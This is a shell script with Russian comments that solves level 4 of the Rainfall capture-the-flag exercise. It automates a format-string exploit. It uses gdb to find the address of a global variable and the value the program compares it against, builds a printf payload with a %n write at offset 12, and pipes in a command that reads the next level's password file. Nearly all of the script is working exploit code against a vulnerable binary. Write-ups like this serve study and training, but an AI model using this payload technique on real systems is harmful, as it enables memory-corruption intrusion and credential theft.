# 1. Запустить программу в дебаггере
# 2. Найти функции main, n, p и глобальную переменную m
# 3. Найти в p небезопасную функцию printf, в которую можно передать в форматную строку
# 4. Увидеть в n вывод пароля при условии равенства m и большого числа
# 5. Определить позицию буфера относительно аргументов printf - 12
# 6. Сохранить строку для ввода с адресом переменной m, отступом по размеру числа, модификатором %n в конце
# 7. Запустить программу со строкой нужной длины и получить пароль

ssh level4@"$RAINFALL_IP" -p 4242 '
    # нахождение адреса m
    M_ADDRESS=$(gdb --batch -ex "info var" ./level4 | grep "m$" | awk "{print \$1}")
    # определение проверемого числа
    EXPECTED_NUMBER=$(
        gdb --batch -ex "disas n" ./level4 |
        grep cmp | awk "{print substr(\$4, 2)}" | cut -d "," -f1
    )
    # создание строки
    M_ADDRESS="\x${M_ADDRESS:8:2}\x${M_ADDRESS:6:2}\x${M_ADDRESS:4:2}\x${M_ADDRESS:2:2}"
    python -c "print \"$M_ADDRESS%$((EXPECTED_NUMBER - 4))x%12\$n\"" > /tmp/level4
    # запуск программы и получение флага
    (cat /tmp/level4 - | ./level4) <<< "cat /home/user/level5/.pass"
'
